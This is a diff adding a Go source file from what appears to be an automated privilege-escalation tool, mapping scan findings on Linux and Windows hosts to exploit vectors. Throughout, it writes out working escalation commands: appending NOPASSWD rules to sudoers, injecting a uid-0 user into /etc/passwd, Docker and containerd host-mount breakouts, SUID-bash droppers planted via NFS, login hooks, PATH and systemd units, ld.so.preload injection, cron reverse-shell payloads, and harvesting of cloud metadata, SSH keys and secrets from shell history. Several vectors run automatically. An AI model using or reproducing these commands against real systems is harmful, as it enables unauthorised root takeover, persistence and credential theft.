@@ -1,0 +1,649 @@
+package autopriv
+
+import (
+	"fmt"
+	"os"
+	"path/filepath"
+	"sort"
+	"strings"
+)
+
+// ================================================================
+// FASE 2 — Enumeration: scanner findings → exploit vectors
+// ================================================================
+
+// validVectors lists every --vector name accepted on the CLI.
+var validVectors = map[string]bool{
+	"suid": true, "sgid": true, "sudo": true, "cron": true, "passwd": true, "shadow": true,
+	"docker": true, "container": true, "caps": true, "nfs": true, "path": true, "service": true,
+	"kernel": true, "cred": true, "preload": true, "sudoers": true,
+	"group": true, "hooks": true, "polkit": true,
+	// Windows vectors (v1.9): enumerated by windows_enum.go on Windows,
+	// honestly empty everywhere else.
+	"winpriv": true, "winreg": true, "winservice": true, "winauto": true,
+	"wintask": true, "wincred": true, "winpath": true,
+}
+
+// vectorCatalog documents what each --vector name actually inspects. It is
+// the single source of truth for --list-vectors (the documentation mode);
+// TestVectorCatalogCoversValidVectors pins it to validVectors so the two
+// maps can never drift apart — a new vector cannot ship without a catalog
+// entry and a catalog entry cannot survive its vector being removed.
+type vectorDoc struct {
+	Desc string // what the vector inspects, one honest sentence
+}
+
+var vectorCatalog = map[string]vectorDoc{
+	"suid":       {Desc: "SUID binaries owned by root that the embedded GTFOBins db knows how to turn into a root shell"},
+	"sgid":       {Desc: "SGID binaries owned by the root group — group-level privilege, never uid 0 directly"},
+	"sudo":       {Desc: "sudo rules visible to this user (sudo -l) and the sudo version on record"},
+	"cron":       {Desc: "writable cron jobs, spools and PATH entries, plus wildcard-injection candidates"},
+	"passwd":     {Desc: "writable /etc/passwd — inject a uid-0 user directly"},
+	"shadow":     {Desc: "readable or writable /etc/shadow — crack or overwrite a root hash"},
+	"docker":     {Desc: "docker group membership or reachable docker socket — mount the host filesystem into a container"},
+	"container":  {Desc: "container runtime context (podman, containerd, docker daemon) — escape surface"},
+	"caps":       {Desc: "file capabilities and the effective permitted set (cap_setuid, cap_dac_override, …)"},
+	"nfs":        {Desc: "NFS exports with no_root_squash or world-writable rw exports"},
+	"path":       {Desc: "writable directories on PATH — hijack binaries a privileged context executes"},
+	"service":    {Desc: "writable systemd units and init.d scripts executed by root"},
+	"kernel":     {Desc: "kernel version matched against known CVEs (heuristic — verify before use)"},
+	"cred":       {Desc: "credentials in shell history files and common config files"},
+	"preload":    {Desc: "writable ld.so.preload, ld.so.conf or ld.so.conf.d — shared-object injection"},
+	"sudoers":    {Desc: "writable sudoers file, sudoers.d directory or per-file drop-ins"},
+	"group":      {Desc: "writable /etc/group — add yourself to a privileged group"},
+	"hooks":      {Desc: "writable login hooks: /etc/environment, /etc/profile.d, /etc/profile, /etc/bash.bashrc"},
+	"polkit":     {Desc: "writable polkit policy surfaces: rules.d (.rules), rule files and localauthority dirs — pkexec without auth"},
+	"winpriv":    {Desc: "Windows token privileges (SeImpersonate, SeBackup, SeDebug, …) and the UAC-filtered-admin surface — the potato family and Priv2Admin primitives"},
+	"winreg":     {Desc: "Windows registry misconfigurations: AlwaysInstallElevated msi-as-SYSTEM, plaintext AutoLogon passwords, UAC disabled"},
+	"winservice": {Desc: "Windows service attack surface: unquoted paths with spaces, binaries in user-writable directories, SYSTEM services running user-profile binaries"},
+	"winauto":    {Desc: "Windows autorun keys (Run/RunOnce, HKLM/HKCU) whose binaries or directories the current user can rewrite"},
+	"wintask":    {Desc: "Windows scheduled tasks executing user-writable commands, privileged tasks with user-profile scripts"},
+	"wincred":    {Desc: "Windows credential artifacts: unattend/sysprep passwords, GPP cpassword, PowerShell history, cloud and SSH key material"},
+	"winpath":    {Desc: "writable directories in the Windows PATH — hijack binaries/DLLs privileged processes resolve"},
+}
+
+// vectorCatalogOrder lists the catalog keys in the canonical order used by
+// --list-vectors (matching the order --vector documents them, not sorted —
+// the display groups the classic vectors first).
+var vectorCatalogOrder = []string{
+	"suid", "sgid", "sudo", "sudoers", "cron", "passwd", "shadow", "group",
+	"docker", "container", "caps", "nfs", "path", "service", "kernel",
+	"cred", "preload", "hooks", "polkit",
+	"winpriv", "winreg", "winservice", "winauto", "wintask", "wincred", "winpath",
+}
+
+// parseVectorList splits and validates a comma-separated --vector argument.
+// "all" is an alias (R34) that expands to every valid vector in sorted
+// order — an alias, never a new category: it can only expand into names
+// that already exist in validVectors, so it cannot smuggle an unknown one.
+func parseVectorList(s string) ([]string, error) {
+	seen := map[string]bool{}
+	var out []string
+	add := func(name string) {
+		if !seen[name] {
+			seen[name] = true
+			out = append(out, name)
+		}
+	}
+	for _, part := range strings.Split(s, ",") {
+		name := strings.ToLower(strings.TrimSpace(part))
+		if name == "" {
+			continue
+		}
+		if name == "all" {
+			for _, v := range strings.Split(vectorNames(), ",") {
+				add(v)
+			}
+			continue
+		}
+		if !validVectors[name] {
+			return nil, fmt.Errorf("unknown vector %q (valid: %s,all)", name, vectorNames())
+		}
+		add(name)
+	}
+	if len(out) == 0 {
+		return nil, fmt.Errorf("empty --vector list (valid: %s,all)", vectorNames())
+	}
+	return out, nil
+}
+
+func vectorNames() string {
+	names := make([]string, 0, len(validVectors))
+	for k := range validVectors {
+		names = append(names, k)
+	}
+	sort.Strings(names)
+	return strings.Join(names, ",")
+}
+
+func enumerateAll(p *AutoPrivilege) {
+	logEnumStart(p.Opts)
+	for _, f := range p.Findings {
+		if !f.Exploitable {
+			continue
+		}
+		switch f.Source {
+		case "SUID":
+			enumerateSUID(p, f)
+		case "SGID":
+			enumerateSGID(p, f)
+		case "SUDO":
+			enumerateSUDO(p, f)
+		case "CRON":
+			enumerateCRON(p, f)
+		case "FILE":
+			if f.Target == "/etc/passwd" {
+				enumeratePasswd(p)
+			}
+			if f.Target == "/etc/shadow" && strings.Contains(f.Description, "Writable") {
+				enumerateShadowWrite(p)
+			} else if f.Target == "/etc/shadow" {
+				enumerateShadowRead(p)
+			}
+		case "DOCKER":
+			enumerateDocker(p)
+		case "CONTAINER":
+			enumerateContainer(p, f)
+		case "CAPS":
+			enumerateCaps(p, f)
+		case "NFS":
+			enumerateNFS(p, f)
+		case "KERNEL":
+			enumerateKernelCVE(p, f)
+		case "CRED":
+			enumerateCredential(p, f)
+		case "PRELOAD":
+			enumeratePreload(p, f)
+		case "SUDOERS":
+			enumerateSudoers(p, f)
+		case "GROUP":
+			enumerateGroup(p, f)
+		case "HOOKS":
+			enumerateHooks(p, f)
+		case "POLKIT":
+			enumeratePolkit(p, f)
+		case "WINPRIV", "WINREG", "WINSVC", "WINAUTO", "WINTASK", "WINCRED", "WINPATH":
+			// Windows findings route through the shared dispatcher (a no-op
+			// on non-Windows platforms — windows_stub.go).
+			enumerateWinFinding(p, f)
+		case "PATH":
+			enumeratePATH(p, f)
+		case "SERVICE":
+			enumerateService(p, f)
+		}
+	}
+}
+
+func enumerateVectors(p *AutoPrivilege, names []string) {
+	for _, name := range names {
+		for _, f := range p.Findings {
+			if !f.Exploitable {
+				continue
+			}
+			switch name {
+			case "suid":
+				if f.Source == "SUID" {
+					enumerateSUID(p, f)
+				}
+			case "sudo":
+				// Own case: it used to live inside "sgid" (copy-
+				// paste artifact), so --vector=sudo enumerated
+				// nothing while --vector=sgid dragged SUDO in.
+				if f.Source == "SUDO" {
+					enumerateSUDO(p, f)
+				}
+			case "sgid":
+				if f.Source == "SGID" {
+					enumerateSGID(p, f)
+				}
+			case "cron":
+				if f.Source == "CRON" {
+					enumerateCRON(p, f)
+				}
+			case "passwd":
+				if f.Source == "FILE" && f.Target == "/etc/passwd" {
+					enumeratePasswd(p)
+				}
+			case "shadow":
+				if f.Source == "FILE" && f.Target == "/etc/shadow" {
+					if strings.Contains(f.Description, "Writable") {
+						enumerateShadowWrite(p)
+					} else {
+						enumerateShadowRead(p)
+					}
+				}
+			case "docker":
+				if f.Source == "DOCKER" {
+					enumerateDocker(p)
+				}
+			case "container":
+				if f.Source == "CONTAINER" {
+					enumerateContainer(p, f)
+				}
+			case "caps":
+				if f.Source == "CAPS" {
+					enumerateCaps(p, f)
+				}
+			case "nfs":
+				if f.Source == "NFS" {
+					enumerateNFS(p, f)
+				}
+			case "path":
+				if f.Source == "PATH" {
+					enumeratePATH(p, f)
+				}
+			case "service":
+				if f.Source == "SERVICE" {
+					enumerateService(p, f)
+				}
+			case "kernel":
+				if f.Source == "KERNEL" {
+					enumerateKernelCVE(p, f)
+				}
+			case "cred":
+				if f.Source == "CRED" {
+					enumerateCredential(p, f)
+				}
+			case "preload":
+				if f.Source == "PRELOAD" {
+					enumeratePreload(p, f)
+				}
+			case "sudoers":
+				if f.Source == "SUDOERS" {
+					enumerateSudoers(p, f)
+				}
+			case "group":
+				if f.Source == "GROUP" {
+					enumerateGroup(p, f)
+				}
+			case "hooks":
+				if f.Source == "HOOKS" {
+					enumerateHooks(p, f)
+				}
+			case "polkit":
+				if f.Source == "POLKIT" {
+					enumeratePolkit(p, f)
+				}
+			case "winpriv":
+				if f.Source == "WINPRIV" {
+					enumerateWinFinding(p, f)
+				}
+			case "winreg":
+				if f.Source == "WINREG" {
+					enumerateWinFinding(p, f)
+				}
+			case "winservice":
+				if f.Source == "WINSVC" {
+					enumerateWinFinding(p, f)
+				}
+			case "winauto":
+				if f.Source == "WINAUTO" {
+					enumerateWinFinding(p, f)
+				}
+			case "wintask":
+				if f.Source == "WINTASK" {
+					enumerateWinFinding(p, f)
+				}
+			case "wincred":
+				if f.Source == "WINCRED" {
+					enumerateWinFinding(p, f)
+				}
+			case "winpath":
+				if f.Source == "WINPATH" {
+					enumerateWinFinding(p, f)
+				}
+			}
+		}
+	}
+}
+
+// addVector registers an auto-exploitable vector.
+func addVector(p *AutoPrivilege, name, category, target, command string, risk RiskLevel, fn func() *ExploitResult, meta map[string]string) {
+	p.Vectors = append(p.Vectors, Vector{
+		Name: name, Category: category, Target: target,
+		Command: command, Risk: risk, Exploit: fn, Meta: meta,
+	})
+}
+
+// addManualVector registers a vector the operator runs by hand: the tool
+// prints the exact command instead of pretending it executed something.
+func addManualVector(p *AutoPrivilege, name, category, target, command string, risk RiskLevel, meta map[string]string) {
+	if meta == nil {
+		meta = map[string]string{}
+	}
+	meta["manual"] = "true"
+	addVector(p, name, category, target, command, risk, nil, meta)
+}
+
+// --- SUID enumeration ---
+func enumerateSUID(p *AutoPrivilege, f Finding) {
+	bin := extractBinName(f.Target)
+	cmd, ok := getCommand(bin)
+	if !ok {
+		return
+	}
+
+	risk := RiskLow
+	if isSuidShellBin(bin) {
+		risk = RiskHigh
+	}
+
+	addVector(p, "SUID "+bin, "suid", f.Target, cmd, risk,
+		func() *ExploitResult {
+			return exploitSUID(f.Target, cmd, p.Opts)
+		},
+		map[string]string{"bin": bin, "path": f.Target})
+}
+
+// --- SGID enumeration ---
+// SGID never grants uid 0, only the owning group — so the vector is always
+// manual: the tool shows the exact GTFOBins technique and states the limit,
+// instead of silently running a command that cannot produce root.
+// Technique provenance is declared (R25): an upstream "sgid" technique wins;
+// when none exists the SUID technique is reused and the note says so.
+func enumerateSGID(p *AutoPrivilege, f Finding) {
+	bin := extractBinName(f.Target)
+	note := "group root — group-level escalation only, no uid 0"
+	cmd, ok := sgidLookup[bin]
+	if !ok {
+		cmd, ok = getCommand(bin)
+		if !ok {
+			return
+		}
+		note += "; SUID technique reused (no sgid-specific entry)"
+	} else {
+		note += "; GTFOBins sgid technique"
+	}
+	addManualVector(p, "SGID "+bin, "sgid", f.Target, cmd, RiskMedium,
+		map[string]string{
+			"bin":  bin,
+			"path": f.Target,
+			"note": note,
+		})
+}
+
+// --- SUDO enumeration ---
+func enumerateSUDO(p *AutoPrivilege, f Finding) {
+	if f.Target == "ALL" {
+		addVector(p, "sudo ALL", "sudo", "sudo -i", "sudo -i", RiskHigh,
+			func() *ExploitResult {
+				return exploitSudoALL(p.Opts)
+			}, nil)
+		return
+	}
+
+	bin := extractBinName(f.Target)
+	cmd, ok := getCommand(bin)
+	if !ok {
+		return
+	}
+
+	risk := RiskMedium
+	if strings.Contains(f.Description, "NOPASSWD") {
+		risk = RiskHigh
+	}
+
+	addVector(p, "sudo "+bin, "sudo", f.Target, "sudo "+cmd, risk,
+		func() *ExploitResult {
+			return exploitSudo(f.Target, cmd, p.Opts)
+		},
+		map[string]string{"bin": bin, "path": f.Target})
+}
+
+// --- Cron enumeration ---
+// The displayed command uses a quoted heredoc: the payload itself contains
+// single quotes (bash -c '...'), so an `echo '<payload>'` line broke the
+// moment an operator copy-pasted it into a shell.
+func enumerateCRON(p *AutoPrivilege, f Finding) {
+	payload := cronPayload(p.Opts.LHost, p.Opts.LPort, f.Target)
+	cmd := fmt.Sprintf("cat >> %s <<'AUTOPRIV_EOF'\n%s\nAUTOPRIV_EOF", f.Target, payload)
+	addVector(p, "cron "+f.Target, "cron", f.Target, cmd, RiskHigh,
+		func() *ExploitResult {
+			return exploitCron(f.Target, p.Opts)
+		},
+		map[string]string{"path": f.Target})
+}
+
+// --- Passwd enumeration ---
+func enumeratePasswd(p *AutoPrivilege) {
+	addVector(p, "passwd injection", "passwd", "/etc/passwd",
+		"echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd", RiskHigh,
+		func() *ExploitResult {
+			return exploitPasswd()
+		}, nil)
+}
+
+func enumerateShadowRead(p *AutoPrivilege) {
+	addVector(p, "shadow readable", "shadow", "/etc/shadow",
+		"cat /etc/shadow   # then: john --wordlist=rockyou.txt hash.txt", RiskHigh,
+		func() *ExploitResult {
+			return readRootHash()
+		}, nil)
+}
+
+func enumerateShadowWrite(p *AutoPrivilege) {
+	addManualVector(p, "shadow overwrite", "shadow", "/etc/shadow",
+		"mkpasswd -m sha-512 'newpass'   # then edit root's hash in /etc/shadow", RiskDanger,
+		map[string]string{"warning": "corrupting /etc/shadow can lock the system"})
+}
+
+// --- Docker enumeration ---
+func enumerateDocker(p *AutoPrivilege) {
+	addVector(p, "docker breakout", "docker", "/var/run/docker.sock",
+		"docker run --rm -v /:/mnt alpine chroot /mnt /bin/sh", RiskHigh,
+		func() *ExploitResult {
+			return exploitDocker(p.Opts)
+		}, nil)
+}
+
+// --- Container enumeration ---
+// The podman socket speaks the Docker API, so the docker CLI is the honest
+// client for it; containerd gets the native ctr one-liner. Both vectors are
+// manual: the breakout is user-visible by definition (a privileged container
+// starts on the host). A reachable docker daemon reuses the existing
+// auto-exploit (docker run -v /:/mnt).
+func enumerateContainer(p *AutoPrivilege, f Finding) {
+	switch {
+	case strings.HasSuffix(f.Target, "podman.sock"):
+		addManualVector(p, "podman breakout", "container", f.Target,
+			fmt.Sprintf("docker -H unix://%s run --rm -v /:/mnt alpine chroot /mnt /bin/sh", f.Target),
+			RiskHigh, map[string]string{"note": "podman.sock speaks the Docker API"})
+	case strings.HasSuffix(f.Target, "containerd.sock"):
+		addManualVector(p, "containerd breakout", "container", f.Target,
+			fmt.Sprintf("ctr --address %s run --rm --mount type=bind,src=/,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest chroot /mnt /bin/sh", f.Target),
+			RiskHigh, nil)
+	case f.Target == "docker-daemon":
+		addVector(p, "docker breakout (daemon)", "container", "/var/run/docker.sock",
+			"docker run --rm -v /:/mnt alpine chroot /mnt /bin/sh", RiskHigh,
+			func() *ExploitResult { return exploitDocker(p.Opts) }, nil)
+	}
+}
+
+// --- Capabilities enumeration ---
+func enumerateCaps(p *AutoPrivilege, f Finding) {
+	// File capability finding: Target is "cap_setuid:/path/to/bin".
+	if path, ok := strings.CutPrefix(f.Target, "cap_setuid:"); ok {
+		cmd := capSetuidPayload(path)
+		addVector(p, "cap_setuid "+filepath.Base(path), "caps", path, cmd, RiskMedium,
+			func() *ExploitResult {
+				return exploitCapBin(path, p.Opts)
+			}, nil)
+		return
+	}
+	if f.Target == "cap_setuid" {
+		// Our own process holds cap_setuid → in-process setuid(0).
+		addVector(p, "cap_setuid (self)", "caps", fmt.Sprintf("pid %d", os.Getpid()),
+			"syscall.Setuid(0) — in-process", RiskMedium,
+			func() *ExploitResult {
+				return exploitSelfCaps()
+			}, nil)
+		return
+	}
+	// Other capabilities → manual guidance only.
+	addManualVector(p, "caps "+f.Target, "caps", f.Target,
+		"review capability: "+f.Description, RiskLow, nil)
+}
+
+// --- NFS enumeration (manual: needs a second root-capable mount point) ---
+func enumerateNFS(p *AutoPrivilege, f Finding) {
+	export := strings.Fields(f.Target)
+	if len(export) == 0 {
+		export = []string{f.Target}
+	}
+	addManualVector(p, "NFS no_root_squash", "nfs", export[0],
+		fmt.Sprintf("mkdir /tmp/nfs && mount -t nfs %s /tmp/nfs && cp /bin/bash /tmp/nfs/rootbash && chmod u+s /tmp/nfs/rootbash", export[0]),
+		RiskHigh,
+		map[string]string{"note": "mount from a host where you already have root; SUID shell then works on the target"})
+}
+
+// --- Kernel CVE enumeration (manual: exploits are not bundled) ---
+func enumerateKernelCVE(p *AutoPrivilege, f Finding) {
+	addManualVector(p, f.Target, "kernel", f.Target,
+		fmt.Sprintf("# %s\n# compile the public exploit for this kernel, or update the host", f.Description),
+		f.Risk, map[string]string{"cve": f.Target})
+}
+
+// --- Credential enumeration ---
+// Every exploitable CRED finding gets a vector: SSH keys as before, plus
+// cloud metadata, shell history and credential-bearing configs as manual
+// techniques, so the dry-run plan and the report no longer drop them.
+func enumerateCredential(p *AutoPrivilege, f Finding) {
+	if isSSHPrivateKey(f.Target) {
+		addManualVector(p, "ssh-key "+filepath.Base(f.Target), "cred", f.Target,
+			fmt.Sprintf("ssh -i %s <user>@<host>", f.Target), RiskHigh,
+			map[string]string{"type": "ssh-private-key"})
+		return
+	}
+	switch {
+	case strings.HasPrefix(f.Target, "http://169.254.169.254"):
+		addManualVector(p, "cloud-metadata "+f.Target, "cred", f.Target,
+			fmt.Sprintf("curl -fsS '%s'   # then walk role-name → security-credentials/ for temp IAM keys", f.Target),
+			RiskHigh,
+			map[string]string{"type": "cloud-metadata", "note": "IMDSv2 hosts require a token header: -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'"})
+	case strings.HasPrefix(f.Description, "History file"):
+		addManualVector(p, "history "+filepath.Base(f.Target), "cred", f.Target,
+			fmt.Sprintf("grep -inE 'password|passwd|secret|token|api_key|aws_|AKIA' %s   # review the hits before reusing anything", f.Target),
+			RiskHigh,
+			map[string]string{"type": "shell-history"})
+	default:
+		addManualVector(p, "creds "+filepath.Base(f.Target), "cred", f.Target,
+			fmt.Sprintf("grep -inE 'password|passw|psk|requirepass|api[_-]?key' %s   # extract, then rotate any secret found", f.Target),
+			RiskMedium,
+			map[string]string{"type": "config-credentials"})
+	}
+}
+
+// --- Preload enumeration ---
+// Only WRITABLE loader surfaces yield vectors: entries already configured
+// by someone else are an investigation lead, not an escalation path for the
+// current user. The ld.so.preload injection needs a compiled shared object,
+// and the ld.so.conf(.d) injection needs a later ldconfig run — both are
+// manual, with the exact technique and the honest requirement spelled out.
+func enumeratePreload(p *AutoPrivilege, f Finding) {
+	// Case-insensitive gate: scanner descriptions open with "Writable"
+	// while the ld.so.preload one embeds lowercase "writable" mid-sentence.
+	if !strings.Contains(strings.ToLower(f.Description), "writable") {
+		return // informational-only finding: nothing to hand over
+	}
+	if f.Target == preloadPaths.conf || f.Target == preloadPaths.confD {
+		addManualVector(p, "library path injection", "preload", f.Target,
+			fmt.Sprintf("printf '/tmp/evil-libs\\n' >> %s\nldconfig   # needs root: it runs on package installs and boot anyway\n# SUID binaries resolve through the cache — a trojan .so in /tmp/evil-libs loads with euid 0", f.Target),
+			RiskHigh,
+			map[string]string{"note": "absorbed by the system's next ldconfig run; survives until the .conf entry is removed"})
+		return
+	}
+	addManualVector(p, "ld.so preload injection", "preload", f.Target,
+		"# build a shared object whose constructor drops a root shell (needs gcc on target), then\n"+
+			"printf '/tmp/autopriv.so\\n' >> /etc/ld.so.preload\n"+
+			"sudo true   # any SUID-root binary loads it with euid 0",
+		RiskHigh,
+		map[string]string{"note": "every SUID binary loads the listed objects with euid 0; persistence survives until the entry is removed"})
+}
+
+// --- Sudoers enumeration ---
+// A writable /etc/sudoers itself can be edited in place: ownership and mode
+// survive an append, so sudo keeps accepting the file — this is the AUTO
+// vector. A writable sudoers.d DIRECTORY only lets us CREATE files, and sudo
+// ignores drop-ins not owned by uid 0 — honest manual guidance instead.
+func enumerateSudoers(p *AutoPrivilege, f Finding) {
+	if f.Target == "/etc/sudoers" {
+		addVector(p, "sudoers write", "sudoers", f.Target,
+			"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo -n -i", RiskHigh,
+			func() *ExploitResult {
+				return exploitSudoersWrite(f.Target, p.Opts)
+			},
+			map[string]string{"path": f.Target})
+		return
+	}
+	addManualVector(p, "sudoers.d drop-in", "sudoers", f.Target,
+		fmt.Sprintf("# drop-ins must be root-owned or sudo ignores them — append to an EXISTING root-owned writable file if any, then:\necho 'ALL ALL=(ALL) NOPASSWD: ALL' >> %s/<root-owned-file> && sudo -n -i", f.Target),
+		RiskHigh,
+		map[string]string{"note": "sudo rejects user-owned drop-ins; only existing root-owned writable files inside the directory are usable"})
+}
+
+// --- Group enumeration ---
+// Joining a privileged group is a config edit, not a code exec: the grant
+// lands on the NEXT login session, so no auto-exploit can honestly claim
+// root from it — manual vector with the exact append and the re-login note.
+func enumerateGroup(p *AutoPrivilege, f Finding) {
+	addManualVector(p, "group self-join", "group", f.Target,
+		fmt.Sprintf("printf 'sudo:x:27:%s\\n' >> %s   # then log out and back in\n# distros using wheel instead: replace 27 with the wheel gid (often 10)", currentUsername(), f.Target),
+		RiskHigh,
+		map[string]string{"note": "takes effect in NEW login sessions; verify the target gid with getent group sudo"})
+}
+
+// --- Login hooks enumeration ---
+// Every writable hook becomes a manual persistence/escalation vector: the
+// payload is a plain append, but it only executes when a (privileged) user
+// logs in — the tool cannot confirm root from it, so honesty keeps it
+// manual. /etc/environment gets the LD_PRELOAD technique; the shell hooks
+// get the direct SUID-shell dropper.
+func enumerateHooks(p *AutoPrivilege, f Finding) {
+	if f.Target == loginHookPaths.environment {
+		addManualVector(p, "environment preload", "hooks", f.Target,
+			"# build a shared object (needs gcc on target), then\nprintf 'LD_PRELOAD=/tmp/autopriv.so\\n' >> /etc/environment\n# any next login session — root's included — loads it at process start",
+			RiskHigh,
+			map[string]string{"note": "environment variables are process-wide: this preloads into login shells AND non-shell logins (ssh, su)"})
+		return
+	}
+	hook := f.Target
+	if info, err := os.Lstat(hook); err == nil && info.IsDir() {
+		hook = filepath.Join(hook, "autopriv.sh")
+	}
+	addManualVector(p, "login-hook "+filepath.Base(f.Target), "hooks", f.Target,
+		fmt.Sprintf("printf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\\n' >> %s\n# next login shell (root's included) plants the SUID bash", hook),
+		RiskHigh,
+		map[string]string{"note": "executes on every future login shell until removed"})
+}
+
+// --- PATH enumeration (manual: payload must wait for a privileged caller) ---
+func enumeratePATH(p *AutoPrivilege, f Finding) {
+	addManualVector(p, "PATH planting "+f.Target, "path", f.Target,
+		fmt.Sprintf("# drop a trojan binary in %s and wait for a privileged process to resolve it\nprintf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash\\nchmod u+s /tmp/rootbash\\n' > %s/.payload && chmod +x %s/.payload",
+			f.Target, f.Target, f.Target),
+		RiskHigh, nil)
+}
+
+// --- Service enumeration (manual: restarting the unit is user-visible) ---
+func enumerateService(p *AutoPrivilege, f Finding) {
+	addManualVector(p, "systemd hijack "+filepath.Base(f.Target), "service", f.Target,
+		fmt.Sprintf("# point ExecStart of %s at your payload, then:\nsed -i 's|^ExecStart=.*|ExecStart=/bin/sh -c \"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\"|' %s\nsystemctl daemon-reload && systemctl restart %s",
+			filepath.Base(f.Target), f.Target, strings.TrimSuffix(filepath.Base(f.Target), ".service")),
+		RiskHigh, nil)
+}
+
+// Helper
+func extractBinName(path string) string {
+	return filepath.Base(path)
+}
+
+// isSSHPrivateKey reports whether a path looks like a private SSH key.
+func isSSHPrivateKey(path string) bool {
+	base := filepath.Base(path)
+	for _, suffix := range []string{"_rsa", "_ed25519", "_ecdsa", "_dsa"} {
+		if strings.HasSuffix(base, suffix) {
+			return true
+		}
+	}
+	return base == "id_rsa" || base == "id_ed25519" || base == "id_ecdsa" || base == "id_dsa"
+}
